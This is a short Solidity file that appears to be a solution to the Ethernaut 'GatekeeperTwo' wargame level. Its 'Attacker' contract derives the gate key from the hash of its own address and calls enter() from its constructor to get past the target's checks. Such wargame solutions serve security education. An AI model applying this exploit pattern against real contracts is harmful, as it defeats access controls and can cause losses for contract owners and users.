// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface GatekeeperTwo {
    function enter(bytes8 _gateKey) external returns (bool);
}

contract Attacker {
    constructor(address _targetAddress) {
        uint64 gateKey = ~uint64(bytes8(keccak256(abi.encodePacked(address(this)))));
        GatekeeperTwo target = GatekeeperTwo(_targetAddress);

        target.enter(bytes8(gateKey));
    }
}
